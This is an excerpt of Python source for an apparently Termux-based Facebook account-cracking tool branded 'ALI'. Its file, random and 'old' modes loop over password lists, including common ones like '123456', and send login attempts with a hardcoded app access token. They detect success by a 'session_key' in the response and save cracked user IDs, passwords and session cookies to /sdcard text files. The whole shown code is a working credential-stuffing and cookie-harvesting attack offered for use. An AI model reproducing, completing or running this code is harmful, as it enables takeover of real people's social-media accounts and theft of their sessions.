...
#-_-_-_-_-_-_-_-<-FILE-MENU->-_-_-_-_-_-_-_-#
    def _F_i_L_e_(self):
    	clear()
    	print(f"{vb} EXAMPLE   {vcv}{G} /{W}sdcard{G}/{W}ALI{G}.{W}txt ")
    	linex()
...
#-_-_-_-_-_-_-_-<-FILE-M1->-_-_-_-_-_-_-_-#
    def _M_1_X_(self,ids,names,passlist):
    	try:
    	    ...
    	    sys.stdout.write(f"\r\r{vb}{G}/{W}>{coloor}ALI-F1{W}<{G}/{W}>{coloor}{self.loop}{W}<{G}/{W}>{B}{len(self.oks)}{W}<{G}/{W}>{Y}{len(self.cps)}{W}< ")
    	    sys.stdout.flush()
    	    fn = names.split(' ')[0]
    	    try:
                ln = names.split(' ')[1]
    	    ...
    	    for pw in passlist:
                ...
                if "session_key" in po:
                    ...
                    print(f"\r\r{vb}{G}/{W}>{B}ALI-OK{W}< {vcv}{B} "+ids+f"{G} / {B}"+pas+"\033[1;97m")
                    print(f"{vb}{G}/{W}>{B}COKIE-X{W}< {vcv}{P} "+cookies)
                    linex()
                    open('/sdcard/ALI-BY-ALI-FILE-M1-OK.txt','a').write(ids+'/'+pas+'/'+cookies+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    print(f"\r\r{vb}{G}/{W}>{Y}ALI-CP{W}< {vcv}{Y} "+ids+f"{G} / {Y}"+pas+"\033[1;97m")
                    linex()
                    open('/sdcard/ALI-BY-ALI-FILE-M1-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
    	    self.loop += 1
    	...
    	try:
    	    ...
    	    for pw in passlist:
                ...
                if "session_key" in po:
                    ...
                    print(f"{vb}{G}/{W}>{B}COKIE-X{W}< {vcv}{P} "+cookies)
                    linex()
                    open('/sdcard/ALI-BY-ALI-FILE-M2-OK.txt','a').write(ids+'/'+pas+'/'+cookies+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    ids = str(po['error']['error_data']['uid'])
                    print(f"\r\r{vb}{G}/{W}>{Y}ALI-CP{W}< {vcv}{Y} "+ids+f"{G} / {Y}"+pas+"\033[1;97m")
                    linex()
                    open('/sdcard/ALI-BY-ALI-FILE-M2-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
    	    self.loop += 1
...
#-_-_-_-_-_-_-_-<-RANDOM-M1->-_-_-_-_-_-_-_-#
    def _M_1_(self,ids,passlist):
    	...
    	sys.stdout.write(f"\r\r{vb}{G}/{W}>{coloor}ALI-R1{W}<{G}/{W}>{coloor}{self.loop}{W}<{G}/{W}>{B}{len(self.oks)}{W}<{G}/{W}>{Y}{len(self.cps)}{W}< ")
    	sys.stdout.flush()
    	try:
            for pas in passlist:
                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                ...
                if "session_key" in po:
                    ...
                    if "Live" in response:
                        print(f"\r\r{vb}{G}/{W}>{B}ALI-OK{W}< {vcv}{B} {str(uid)} {G}/{B} {pas}")
                        print(f"{vb}{G}/{W}>{B}COKIE-X{W}< {vcv}{P} "+cookies)
                        linex()
                        open('/sdcard/ALI-BY-ALI-RANDOM-M1-OK.txt','a').write(str(uid)+'/'+pas+'/'+cookies+'\n')
                        self.oks.append(str(uid))
                        break
                elif 'www.facebook.com' in po['error']['message']:
                    uid = po['error']['error_data']['uid']
                    print(f"\r\r{vb}{G}/{W}>{Y}ALI-CP{W}< {vcv}{Y} {str(uid)} {G}/{Y} {pas}")
                    linex()
                    open('/sdcard/ALI-BY-ALI-RANDOM-M1-CP.txt','a').write(str(uid)+'/'+pas+'\n')
            ...
            for pas in passlist:
                ...
                if "session_key" in po:
                    ...
                    if "Live" in response:
                        ...
                        print(f"{vb}{G}/{W}>{B}COKIE-X{W}< {vcv}{P} "+cookies)
                        linex()
                        open('/sdcard/ALI-BY-ALI-RANDOM-M2-OK.txt','a').write(str(uid)+'/'+pas+'/'+cookies+'\n')
                        self.oks.append(str(uid))
                        break
                elif 'www.facebook.com' in po['error']['message']:
                    uid = po['error']['error_data']['uid']
                    print(f"\r\r{vb}{G}/{W}>{Y}ALI-CP{W}< {vcv}{Y} {str(uid)} {G}/{Y} {pas}")
                    linex()
                    open('/sdcard/ALI-BY-ALI-RANDOM-M2-CP.txt','a').write(str(uid)+'/'+pas+'\n')
                    self.cps.append(str(uid))
                    break
                else:continue
            self.loop += 1
...
#-_-_-_-_-_-_-_-<-OLD-M->-_-_-_-_-_-_-_-#
    def _O_l_D_(self,ids):
    	try:
    	    global loop,oks,cps
    	    coloor = random.choice(["\x1b[38;5;1m","\x1b[38;5;2m","\x1b[38;5;3m","\x1b[38;5;4m","\x1b[38;5;5m","\x1b[38;5;6m","\x1b[38;5;7m","\x1b[38;5;8m","\x1b[38;5;9m","\x1b[38;5;10m","\x1b[38;5;11m","\x1b[38;5;12m","\x1b[38;5;13m","\x1b[38;5;14m","\x1b[38;5;15m","\x1b[38;5;16m","\x1b[38;5;17m","\x1b[38;5;18m","\x1b[38;5;19m","\x1b[38;5;20m","\x1b[38;5;21m","\x1b[38;5;22m","\x1b[38;5;23m","\x1b[38;5;24m","\x1b[38;5;25m","\x1b[38;5;26m","\x1b[38;5;27m","\x1b[38;5;28m","\x1b[38;5;29m","\x1b[38;5;30m","\x1b[38;5;31m","\x1b[38;5;32m","\x1b[38;5;33m","\x1b[38;5;34m","\x1b[38;5;35m","\x1b[38;5;36m","\x1b[38;5;37m","\x1b[38;5;38m","\x1b[38;5;39m","\x1b[38;5;40m","\x1b[38;5;41m","\x1b[38;5;42m","\x1b[38;5;43m","\x1b[38;5;44m","\x1b[38;5;45m","\x1b[38;5;46m","\x1b[38;5;47m","\x1b[38;5;48m","\x1b[38;5;49m","\x1b[38;5;50m","\x1b[38;5;51m","\x1b[38;5;52m","\x1b[38;5;53m","\x1b[38;5;54m","\x1b[38;5;55m","\x1b[38;5;56m","\x1b[38;5;57m","\x1b[38;5;58m","\x1b[38;5;59m","\x1b[38;5;60m","\x1b[38;5;61m","\x1b[38;5;62m","\x1b[38;5;63m","\x1b[38;5;64m","\x1b[38;5;65m","\x1b[38;5;66m","\x1b[38;5;67m","\x1b[38;5;68m","\x1b[38;5;69m","\x1b[38;5;70m","\x1b[38;5;71m","\x1b[38;5;72m","\x1b[38;5;73m","\x1b[38;5;74m","\x1b[38;5;75m","\x1b[38;5;76m","\x1b[38;5;77m","\x1b[38;5;78m","\x1b[38;5;79m","\x1b[38;5;80m","\x1b[38;5;81m","\x1b[38;5;82m","\x1b[38;5;83m","\x1b[38;5;84m","\x1b[38;5;85m","\x1b[38;5;86m","\x1b[38;5;87m","\x1b[38;5;88m","\x1b[38;5;89m","\x1b[38;5;90m","\x1b[38;5;91m","\x1b[38;5;92m","\x1b[38;5;93m","\x1b[38;5;94m","\x1b[38;5;95m","\x1b[38;5;96m","\x1b[38;5;97m","\x1b[38;5;98m","\x1b[38;5;99m"])
    	    sys.stdout.write(f"\r\r{vb}{G}/{W}>{coloor}ALI-O1{W}<{G}/{W}>{coloor}{self.loop}{W}<{G}/{W}>{B}{len(self.oks)}{W}<{G}/{W}>{Y}{len(self.cps)}{W}< ")
    	    sys.stdout.flush()
    	    for pas in ["123456","1234567","12345678","123456789","123123","143143"]:
                ...
                po = requests.post(url,data=data,headers=headers).json()
                if "session_key" in po:
                    print(f"\r\r{vb}{G}/{W}>{B}ALI-OK{W}< {vcv}{B} {ids}{G} / {B}{pas} \033[1;97m")
                    open('/sdcard/ALI-BY-ALI-OLD-OK.txt','a').write(ids+'/'+pas+'\n')
                    self.oks.append(ids)
                    break
                elif 'www.facebook.com' in po['error']['message']:
                    print(f"\r\r{vb}{G}/{W}>{Y}NOOR-CP{W}< {vcv}{Y} {ids}{G} / {Y}{pas} \033[1;97m")
                    open('/sdcard/ALI-BY-ALI-OLD-CP.txt','a').write(ids+'/'+pas+'\n')
                    self.cps.append(ids)
                    break
                else:continue
    	    self.loop += 1
